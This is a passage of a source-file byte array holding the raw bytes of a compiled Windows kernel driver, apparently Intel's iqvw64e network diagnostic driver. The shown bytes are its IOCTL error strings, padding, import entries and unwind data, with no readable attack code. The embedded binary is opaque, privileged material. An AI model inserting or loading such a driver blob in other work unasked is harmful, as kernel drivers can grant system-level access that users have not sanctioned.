		0x69, 0x66, 0x69, 0x63, 0x49, 0x6F, 0x63, 0x74, 0x6C, 0x3A, 0x20, 0x4E, 0x41, 0x4C, 0x5F, 0x57, 0x49, 0x4E, 0x5F, 0x44, 0x52, 0x49, 0x56, 0x45, 0x52, 0x5F, 0x47, 0x45, 0x54, 0x5F, 0x52, 0x45, 0x46, 0x5F, 0x43, 0x4F, 0x55, 0x4E, 0x54, 0x5F,
		0x46, 0x55, 0x4E, 0x43, 0x49, 0x44, 0x20, 0x46, 0x75, 0x6E, 0x63, 0x74, 0x69, 0x6F, 0x6E, 0x44, 0x61, 0x74, 0x61, 0x20, 0x69, 0x73, 0x20, 0x4E, 0x55, 0x4C, 0x4C, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
		0x4E, 0x61, 0x6C, 0x52, 0x65, 0x73, 0x6F, 0x6C, 0x76, 0x65, 0x4F, 0x73, 0x53, 0x70, 0x65, 0x63, 0x69, 0x66, 0x69, 0x63, 0x49, 0x6F, 0x63, 0x74, 0x6C, 0x3A, 0x20, 0x4E, 0x41, 0x4C, 0x5F, 0x57, 0x49, 0x4E, 0x5F, 0x4F, 0x53, 0x5F, 0x44, 0x45,
		0x56, 0x49, 0x43, 0x45, 0x5F, 0x46, 0x55, 0x4E, 0x43, 0x49, 0x44, 0x20, 0x46, 0x75, 0x6E, 0x63, 0x74, 0x69, 0x6F, 0x6E, 0x44, 0x61, 0x74, 0x61, 0x20, 0x69, 0x73, 0x20, 0x4E, 0x55, 0x4C, 0x4C, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
		0x4E, 0x61, 0x6C, 0x52, 0x65, 0x73, 0x6F, 0x6C, 0x76, 0x65, 0x4F, 0x73, 0x53, 0x70, 0x65, 0x63, 0x69, 0x66, 0x69, 0x63, 0x49, 0x6F, 0x63, 0x74, 0x6C, 0x3A, 0x20, 0x4E, 0x41, 0x4C, 0x5F, 0x57, 0x49, 0x4E, 0x5F, 0x46, 0x52, 0x45, 0x45, 0x5F,
		0x44, 0x45, 0x56, 0x5F, 0x43, 0x4F, 0x4E, 0x54, 0x45, 0x58, 0x54, 0x5F, 0x46, 0x55, 0x4E, 0x43, 0x49, 0x44, 0x20, 0x46, 0x75, 0x6E, 0x63, 0x74, 0x69, 0x6F, 0x6E, 0x44, 0x61, 0x74, 0x61, 0x20, 0x69, 0x73, 0x20, 0x4E, 0x55, 0x4C, 0x4C, 0x0A,
		0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x4E, 0x61, 0x6C, 0x52, 0x65, 0x73, 0x6F, 0x6C, 0x76, 0x65, 0x4F, 0x73, 0x53, 0x70, 0x65, 0x63, 0x69, 0x66, 0x69, 0x63, 0x49, 0x6F, 0x63, 0x74,
		0x6C, 0x3A, 0x20, 0x4E, 0x41, 0x4C, 0x5F, 0x57, 0x49, 0x4E, 0x5F, 0x41, 0x4C, 0x4C, 0x4F, 0x43, 0x5F, 0x44, 0x45, 0x56, 0x5F, 0x43, 0x4F, 0x4E, 0x54, 0x45, 0x58, 0x54, 0x5F, 0x46, 0x55, 0x4E, 0x43, 0x49, 0x44, 0x20, 0x46, 0x75, 0x6E, 0x63,
		0x74, 0x69, 0x6F, 0x6E, 0x44, 0x61, 0x74, 0x61, 0x20, 0x69, 0x73, 0x20, 0x4E, 0x55, 0x4C, 0x4C, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x4E, 0x61, 0x6C, 0x52, 0x65, 0x73, 0x6F, 0x6C,
		0x76, 0x65, 0x4F, 0x73, 0x53, 0x70, 0x65, 0x63, 0x69, 0x66, 0x69, 0x63, 0x49, 0x6F, 0x63, 0x74, 0x6C, 0x3A, 0x20, 0x4E, 0x41, 0x4C, 0x5F, 0x57, 0x49, 0x4E, 0x5F, 0x47, 0x45, 0x54, 0x5F, 0x53, 0x59, 0x4D, 0x42, 0x4F, 0x4C, 0x49, 0x43, 0x5F,
		0x4E, 0x41, 0x4D, 0x45, 0x5F, 0x46, 0x55, 0x4E, 0x43, 0x49, 0x44, 0x20, 0x46, 0x75, 0x6E, 0x63, 0x74, 0x69, 0x6F, 0x6E, 0x44, 0x61, 0x74, 0x61, 0x20, 0x69, 0x73, 0x20, 0x4E, 0x55, 0x4C, 0x4C, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
		0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x4E, 0x61, 0x6C, 0x52, 0x65, 0x73, 0x6F, 0x6C, 0x76, 0x65, 0x4F, 0x73, 0x53, 0x70, 0x65, 0x63, 0x69, 0x66, 0x69, 0x63, 0x49, 0x6F, 0x63, 0x74, 0x6C, 0x3A, 0x20, 0x4E, 0x41, 0x4C, 0x5F, 0x57,
		0x49, 0x4E, 0x5F, 0x47, 0x45, 0x54, 0x5F, 0x50, 0x44, 0x4F, 0x5F, 0x50, 0x4F, 0x49, 0x4E, 0x54, 0x45, 0x52, 0x5F, 0x46, 0x55, 0x4E, 0x43, 0x49, 0x44, 0x20, 0x46, 0x75, 0x6E, 0x63, 0x74, 0x69, 0x6F, 0x6E, 0x44, 0x61, 0x74, 0x61, 0x20, 0x69,
		0x73, 0x20, 0x4E, 0x55, 0x4C, 0x4C, 0x0A, 0x00, 0x4E, 0x61, 0x6C, 0x4F, 0x73, 0x53, 0x70, 0x65, 0x63, 0x69, 0x66, 0x69, 0x63, 0x49, 0x6F, 0x63, 0x74, 0x6C, 0x3A, 0x20, 0x46, 0x75, 0x6E, 0x63, 0x74, 0x69, 0x6F, 0x6E, 0x49, 0x64, 0x20, 0x3D,
		0x20, 0x25, 0x64, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x68, 0x27, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x84, 0x27, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0xA2, 0x24, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0xBA, 0x24, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0xCC, 0x24, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0xE2, 0x24, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFA, 0x24, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x0E, 0x25, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x26, 0x25, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x32, 0x25, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3C, 0x25, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x25, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x54, 0x25, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x74, 0x25, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x90, 0x25, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0xA0, 0x25, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0xB2, 0x25, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00,
		0xC8, 0x25, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0xE6, 0x25, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x8A, 0x24, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x26, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x28, 0x26, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x40, 0x26, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x50, 0x26, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x70, 0x26, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x84, 0x26, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x8E, 0x26, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00,
		0xA2, 0x26, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0xAC, 0x26, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0xCC, 0x26, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0xE2, 0x26, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0xEE, 0x26, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00,
		0xF8, 0x26, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x14, 0x27, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2C, 0x27, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4A, 0x27, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x72, 0x24, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x26, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x60, 0x24, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC3, 0xEA, 0x84, 0x52,
		0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x74, 0x00, 0x00, 0x00, 0x6C, 0x61, 0x00, 0x00, 0x6C, 0x4D, 0x00, 0x00, 0x52, 0x53, 0x44, 0x53, 0x50, 0xBB, 0x0A, 0xBE, 0xA9, 0x09, 0x86, 0x42, 0x88, 0x6B, 0x33, 0x67, 0x56, 0x27, 0x97, 0x21,
		0x01, 0x00, 0x00, 0x00, 0x63, 0x3A, 0x5C, 0x75, 0x73, 0x65, 0x72, 0x73, 0x5C, 0x63, 0x6C, 0x6F, 0x75, 0x64, 0x62, 0x75, 0x69, 0x6C, 0x64, 0x5C, 0x33, 0x33, 0x37, 0x32, 0x34, 0x34, 0x5C, 0x73, 0x64, 0x6B, 0x5C, 0x6E, 0x61, 0x6C, 0x5C, 0x73,
		0x72, 0x63, 0x5C, 0x77, 0x69, 0x6E, 0x6E, 0x74, 0x5F, 0x77, 0x64, 0x6D, 0x5C, 0x64, 0x72, 0x69, 0x76, 0x65, 0x72, 0x5C, 0x6F, 0x62, 0x6A, 0x66, 0x72, 0x65, 0x5F, 0x77, 0x6E, 0x65, 0x74, 0x5F, 0x41, 0x4D, 0x44, 0x36, 0x34, 0x5C, 0x61, 0x6D,
		0x64, 0x36, 0x34, 0x5C, 0x69, 0x71, 0x76, 0x77, 0x36, 0x34, 0x65, 0x2E, 0x70, 0x64, 0x62, 0x00, 0x01, 0x06, 0x02, 0x00, 0x06, 0x52, 0x02, 0x30, 0x01, 0x06, 0x02, 0x00, 0x06, 0x32, 0x02, 0x30, 0x01, 0x06, 0x02, 0x00, 0x06, 0x32, 0x02, 0x30,
		0x01, 0x15, 0x05, 0x00, 0x15, 0x74, 0x09, 0x00, 0x10, 0x34, 0x08, 0x00, 0x04, 0x42, 0x00, 0x00, 0x01, 0x02, 0x01, 0x00, 0x02, 0x30, 0x00, 0x00, 0x21, 0x00, 0x00, 0x00, 0x10, 0x20, 0x5D, 0x00, 0x33, 0x20, 0x5D, 0x00, 0x34, 0x62, 0x00, 0x00,
		0x21, 0x04, 0x02, 0x00, 0x04, 0x74, 0x11, 0x00, 0x10, 0x20, 0x5D, 0x00, 0x33, 0x20, 0x5D, 0x00, 0x34, 0x62, 0x00, 0x00, 0x01, 0x0B, 0x03, 0x00, 0x0B, 0x34, 0x10, 0x00, 0x07, 0xC2, 0x00, 0x00, 0x01, 0x06, 0x02, 0x00, 0x06, 0x32, 0x02, 0x30,
		0x01, 0x11, 0x05, 0x00, 0x11, 0x74, 0x0B, 0x00, 0x0C, 0x34, 0x0A, 0x00, 0x04, 0x62, 0x00, 0x00, 0x01, 0x09, 0x03, 0x00, 0x09, 0x01, 0x26, 0x00, 0x02, 0x30, 0x00, 0x00, 0x21, 0x00, 0x00, 0x00, 0x50, 0x1D, 0x00, 0x00, 0x67, 0x1D, 0x00, 0x00,
		0x88, 0x62, 0x00, 0x00, 0x21, 0x05, 0x02, 0x00, 0x05, 0x74, 0x09, 0x00, 0x50, 0x1D, 0x00, 0x00, 0x67, 0x1D, 0x00, 0x00, 0x88, 0x62, 0x00, 0x00, 0x01, 0x0E, 0x03, 0x00, 0x0E, 0x34, 0x08, 0x00, 0x04, 0x42, 0x00, 0x00, 0x01, 0x04, 0x01, 0x00,
		0x04, 0x42, 0x00, 0x00, 0x01, 0x06, 0x02, 0x00, 0x06, 0x32, 0x02, 0x30, 0x01, 0x06, 0x02, 0x00, 0x06, 0x32, 0x02, 0x30, 0x01, 0x2A, 0x02, 0x00, 0x1B, 0x01, 0x87, 0x00, 0x01, 0x21, 0x0D, 0x00, 0x21, 0xD4, 0x09, 0x00, 0x1D, 0xC4, 0x0A, 0x00,
		0x17, 0x74, 0x0F, 0x00, 0x13, 0x64, 0x0E, 0x00, 0x0F, 0x54, 0x0D, 0x00, 0x0B, 0x34, 0x0C, 0x00, 0x07, 0xA2, 0x00, 0x00, 0x01, 0x11, 0x05, 0x00, 0x11, 0x74, 0x04, 0x00, 0x0C, 0x34, 0x09, 0x00, 0x04, 0x42, 0x00, 0x00, 0x21, 0x00, 0x00, 0x00,
		0x20, 0x22, 0x00, 0x00, 0x4E, 0x22, 0x00, 0x00, 0x28, 0x63, 0x00, 0x00, 0x21, 0x00, 0x02, 0x00, 0x00, 0xE4, 0x04, 0x00, 0x20, 0x22, 0x00, 0x00, 0x4E, 0x22, 0x00, 0x00, 0x28, 0x63, 0x00, 0x00, 0x21, 0x1D, 0x08, 0x00, 0x1D, 0xE4, 0x04, 0x00,
		0x0F, 0xD4, 0x05, 0x00, 0x08, 0x74, 0x07, 0x00, 0x04, 0x34, 0x0A, 0x00, 0x20, 0x22, 0x00, 0x00, 0x4E, 0x22, 0x00, 0x00, 0x28, 0x63, 0x00, 0x00, 0x01, 0x16, 0x07, 0x00, 0x16, 0xC4, 0x06, 0x00, 0x12, 0x64, 0x08, 0x00, 0x0E, 0x54, 0x09, 0x00,
		0x07, 0xA2, 0x00, 0x00, 0x01, 0x2A, 0x0B, 0x00, 0x2A, 0x74, 0x0B, 0x00, 0x1D, 0x34, 0x08, 0x00, 0x13, 0xC4, 0x06, 0x00, 0x0E, 0x64, 0x0A, 0x00, 0x09, 0x54, 0x09, 0x00, 0x04, 0x62, 0x00, 0x00, 0x21, 0x00, 0x00, 0x00, 0x50, 0x24, 0x00, 0x00,
		0x66, 0x24, 0x00, 0x00, 0x88, 0x63, 0x00, 0x00, 0x21, 0x2A, 0x08, 0x00, 0x2A, 0x74, 0x09, 0x00, 0x1D, 0x34, 0x06, 0x00, 0x0A, 0x64, 0x08, 0x00, 0x05, 0x54, 0x07, 0x00, 0x50, 0x24, 0x00, 0x00, 0x66, 0x24, 0x00, 0x00, 0x88, 0x63, 0x00, 0x00,
		0x01, 0x04, 0x01, 0x00, 0x04, 0x42, 0x00, 0x00, 0x21, 0x00, 0x00, 0x00, 0x20, 0x25, 0x00, 0x00, 0x8D, 0x25, 0x00, 0x00, 0xBC, 0x63, 0x00, 0x00, 0x21, 0x0F, 0x06, 0x00, 0x0F, 0xC4, 0x0A, 0x00, 0x0A, 0x74, 0x0F, 0x00, 0x05, 0x64, 0x0E, 0x00,
		0x20, 0x25, 0x00, 0x00, 0x8D, 0x25, 0x00, 0x00, 0xBC, 0x63, 0x00, 0x00, 0x01, 0x23, 0x0B, 0x00, 0x23, 0xF4, 0x07, 0x00, 0x18, 0xE4, 0x08, 0x00, 0x13, 0xD4, 0x09, 0x00, 0x0E, 0x54, 0x0D, 0x00, 0x09, 0x34, 0x0C, 0x00, 0x04, 0xA2, 0x00, 0x00,
		0x21, 0x46, 0x06, 0x00, 0x46, 0x64, 0x05, 0x00, 0x3D, 0x34, 0x06, 0x00, 0x00, 0x74, 0x04, 0x00, 0x70, 0x27, 0x00, 0x00, 0x82, 0x27, 0x00, 0x00, 0x18, 0x64, 0x00, 0x00, 0x21, 0x00, 0x00, 0x00, 0x70, 0x27, 0x00, 0x00, 0x82, 0x27, 0x00, 0x00,
		0x18, 0x64, 0x00, 0x00, 0x21, 0x05, 0x02, 0x00, 0x05, 0x74, 0x04, 0x00, 0x70, 0x27, 0x00, 0x00, 0x82, 0x27, 0x00, 0x00, 0x18, 0x64, 0x00, 0x00, 0x01, 0x04, 0x01, 0x00, 0x04, 0x62, 0x00, 0x00, 0x01, 0x04, 0x01, 0x00, 0x04, 0x62, 0x00, 0x00,
		0x21, 0x14, 0x06, 0x00, 0x14, 0x64, 0x06, 0x00, 0x0D, 0x34, 0x0B, 0x00, 0x00, 0x74, 0x05, 0x00, 0xE0, 0x28, 0x00, 0x00, 0xE9, 0x28, 0x00, 0x00, 0x68, 0x64, 0x00, 0x00, 0x21, 0x00, 0x00, 0x00, 0xE0, 0x28, 0x00, 0x00, 0xE9, 0x28, 0x00, 0x00,
		0x68, 0x64, 0x00, 0x00, 0x21, 0x05, 0x02, 0x00, 0x05, 0x74, 0x05, 0x00, 0xE0, 0x28, 0x00, 0x00, 0xE9, 0x28, 0x00, 0x00, 0x68, 0x64, 0x00, 0x00, 0x01, 0x04, 0x01, 0x00, 0x04, 0x62, 0x00, 0x00, 0x21, 0x00, 0x00, 0x00, 0xC0, 0x29, 0x00, 0x00,
		0xF4, 0x29, 0x00, 0x00, 0xCC, 0x64, 0x00, 0x00, 0x21, 0x00, 0x02, 0x00, 0x00, 0x34, 0x06, 0x00, 0xC0, 0x29, 0x00, 0x00, 0xF4, 0x29, 0x00, 0x00, 0xCC, 0x64, 0x00, 0x00, 0x21, 0x00, 0x00, 0x00, 0xF4, 0x29, 0x00, 0x00, 0x0F, 0x2A, 0x00, 0x00,
		0xB8, 0x64, 0x00, 0x00, 0x21, 0x05, 0x02, 0x00, 0x05, 0x64, 0x08, 0x00, 0xF4, 0x29, 0x00, 0x00, 0x0F, 0x2A, 0x00, 0x00, 0xB8, 0x64, 0x00, 0x00, 0x21, 0x05, 0x02, 0x00, 0x05, 0x34, 0x06, 0x00, 0xC0, 0x29, 0x00, 0x00, 0xF4, 0x29, 0x00, 0x00,
		0xCC, 0x64, 0x00, 0x00, 0x01, 0x16, 0x07, 0x00, 0x16, 0xC4, 0x04, 0x00, 0x11, 0x74, 0x09, 0x00, 0x0C, 0x54, 0x07, 0x00, 0x04, 0x42, 0x00, 0x00, 0x21, 0x00, 0x00, 0x00, 0xC0, 0x2A, 0x00, 0x00, 0xE0, 0x2A, 0x00, 0x00, 0x1C, 0x65, 0x00, 0x00,
		0x21, 0x00, 0x02, 0x00, 0x00, 0x34, 0x07, 0x00, 0xC0, 0x2A, 0x00, 0x00, 0xE0, 0x2A, 0x00, 0x00, 0x1C, 0x65, 0x00, 0x00, 0x21, 0x1C, 0x04, 0x00, 0x1C, 0x64, 0x08, 0x00, 0x05, 0x34, 0x07, 0x00, 0xC0, 0x2A, 0x00, 0x00, 0xE0, 0x2A, 0x00, 0x00,
		0x1C, 0x65, 0x00, 0x00, 0x01, 0x0C, 0x03, 0x00, 0x0C, 0x74, 0x09, 0x00, 0x04, 0x42, 0x00, 0x00, 0x01, 0x14, 0x05, 0x00, 0x14, 0x74, 0x13, 0x00, 0x0B, 0x34, 0x12, 0x00, 0x07, 0xE2, 0x00, 0x00, 0x01, 0x24, 0x0A, 0x00, 0x24, 0x74, 0x0F, 0x00,
		0x16, 0x64, 0x10, 0x00, 0x12, 0x54, 0x11, 0x00, 0x0E, 0x34, 0x12, 0x00, 0x0A, 0x01, 0x13, 0x00, 0x21, 0x00, 0x02, 0x00, 0x00, 0xD4, 0x40, 0x00, 0x70, 0x2D, 0x00, 0x00, 0x89, 0x2D, 0x00, 0x00, 0xB4, 0x65, 0x00, 0x00, 0x21, 0x00, 0x00, 0x00,
		0x89, 0x2D, 0x00, 0x00, 0xD0, 0x2E, 0x00, 0x00, 0x8C, 0x65, 0x00, 0x00, 0x21, 0x16, 0x04, 0x00, 0x16, 0x64, 0x47, 0x00, 0x08, 0xF4, 0x3E, 0x00, 0x89, 0x2D, 0x00, 0x00, 0xD0, 0x2E, 0x00, 0x00, 0x8C, 0x65, 0x00, 0x00, 0x21, 0xEF, 0x0C, 0x00,
		0xEF, 0xD4, 0x40, 0x00, 0x1B, 0xE4, 0x3F, 0x00, 0x14, 0xC4, 0x41, 0x00, 0x0C, 0x74, 0x42, 0x00, 0x08, 0x54, 0x46, 0x00, 0x04, 0x34, 0x45, 0x00, 0x70, 0x2D, 0x00, 0x00, 0x89, 0x2D, 0x00, 0x00, 0xB4, 0x65, 0x00, 0x00, 0x01, 0x19, 0x02, 0x00,
		0x0A, 0x01, 0x43, 0x00, 0x01, 0x27, 0x06, 0x00, 0x27, 0x74, 0x17, 0x00, 0x1F, 0x34, 0x16, 0x00, 0x0A, 0x01, 0x13, 0x00, 0x21, 0x00, 0x00, 0x00, 0xB0, 0x32, 0x00, 0x00, 0x3A, 0x33, 0x00, 0x00, 0x20, 0x66, 0x00, 0x00, 0x21, 0x00, 0x00, 0x00,
		0x3A, 0x33, 0x00, 0x00, 0x65, 0x33, 0x00, 0x00, 0x0C, 0x66, 0x00, 0x00, 0x21, 0x1D, 0x08, 0x00, 0x1D, 0xC4, 0x0F, 0x00, 0x18, 0x74, 0x10, 0x00, 0x10, 0x64, 0x15, 0x00, 0x08, 0x54, 0x14, 0x00, 0x3A, 0x33, 0x00, 0x00, 0x65, 0x33, 0x00, 0x00,
		0x0C, 0x66, 0x00, 0x00, 0x21, 0x08, 0x02, 0x00, 0x08, 0x34, 0x13, 0x00, 0xB0, 0x32, 0x00, 0x00, 0x3A, 0x33, 0x00, 0x00, 0x20, 0x66, 0x00, 0x00, 0x01, 0x1E, 0x06, 0x00, 0x1E, 0xE4, 0x0D, 0x00, 0x1A, 0xD4, 0x0E, 0x00, 0x0A, 0x01, 0x11, 0x00,
		0x21, 0x00, 0x04, 0x00, 0x00, 0x74, 0x0B, 0x00, 0x00, 0x64, 0x0A, 0x00, 0x40, 0x35, 0x00, 0x00, 0x4B, 0x35, 0x00, 0x00, 0x64, 0x66, 0x00, 0x00, 0x21, 0x15, 0x06, 0x00, 0x15, 0x74, 0x0B, 0x00, 0x08, 0x64, 0x0A, 0x00, 0x04, 0x54, 0x09, 0x00,
		0x40, 0x35, 0x00, 0x00, 0x4B, 0x35, 0x00, 0x00, 0x64, 0x66, 0x00, 0x00, 0x01, 0x0B, 0x03, 0x00, 0x0B, 0x34, 0x08, 0x00, 0x07, 0x62, 0x00, 0x00, 0x21, 0x00, 0x04, 0x00, 0x00, 0x74, 0x0B, 0x00, 0x00, 0x64, 0x0A, 0x00, 0x40, 0x36, 0x00, 0x00,
		0x4B, 0x36, 0x00, 0x00, 0xA4, 0x66, 0x00, 0x00, 0x21, 0x13, 0x06, 0x00, 0x13, 0x74, 0x0B, 0x00, 0x08, 0x64, 0x0A, 0x00, 0x04, 0x54, 0x09, 0x00, 0x40, 0x36, 0x00, 0x00, 0x4B, 0x36, 0x00, 0x00, 0xA4, 0x66, 0x00, 0x00, 0x01, 0x0B, 0x03, 0x00,
		0x0B, 0x34, 0x08, 0x00, 0x07, 0x62, 0x00, 0x00, 0x21, 0x00, 0x00, 0x00, 0x40, 0x37, 0x00, 0x00, 0x7E, 0x37, 0x00, 0x00, 0xD4, 0x66, 0x00, 0x00, 0x21, 0x05, 0x02, 0x00, 0x05, 0x34, 0x0A, 0x00, 0x40, 0x37, 0x00, 0x00, 0x7E, 0x37, 0x00, 0x00,
		0xD4, 0x66, 0x00, 0x00, 0x01, 0x10, 0x03, 0x00, 0x10, 0x74, 0x0B, 0x00, 0x04, 0x62, 0x00, 0x00, 0x01, 0x22, 0x09, 0x00, 0x22, 0x74, 0x0B, 0x00, 0x1D, 0x64, 0x0A, 0x00, 0x10, 0x54, 0x09, 0x00, 0x09, 0x34, 0x08, 0x00, 0x04, 0x62, 0x00, 0x00,
